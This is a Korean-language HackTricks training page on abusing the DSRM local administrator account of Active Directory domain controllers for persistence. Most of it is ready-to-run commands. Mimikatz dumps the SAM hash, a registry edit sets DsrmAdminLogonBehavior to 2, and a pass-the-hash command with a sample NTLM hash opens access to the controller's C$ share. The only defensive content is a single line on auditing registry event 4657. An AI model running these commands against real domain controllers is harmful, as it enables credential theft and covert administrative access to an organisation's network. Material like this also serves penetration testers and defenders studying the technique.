{{#include ../../banners/hacktricks-training.md}}

# DSRM 자격 증명

각 **DC**에는 **로컬 관리자** 계정이 있습니다. 이 머신에서 관리자 권한을 가지면 mimikatz를 사용하여 **로컬 관리자 해시**를 **덤프**할 수 있습니다. 그런 다음 레지스트리를 수정하여 이 비밀번호를 **활성화**하여 이 로컬 관리자 사용자에 원격으로 접근할 수 있습니다.\
먼저 DC 내의 **로컬 관리자** 사용자 해시를 **덤프**해야 합니다:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
그런 다음 해당 계정이 작동하는지 확인해야 하며, 레지스트리 키의 값이 "0"이거나 존재하지 않으면 **"2"로 설정해야 합니다**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
그런 다음, PTH를 사용하여 **C$의 내용을 나열하거나 심지어 셸을 얻을 수 있습니다**. 메모리에 있는 해당 해시로 새 PowerShell 세션을 생성할 때 (PTH의 경우) **사용되는 "도메인"은 DC 머신의 이름일 뿐입니다:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
더 많은 정보는 다음에서 확인할 수 있습니다: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) 및 [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## 완화

- 이벤트 ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`의 감사 생성/변경

{{#include ../../banners/hacktricks-training.md}}
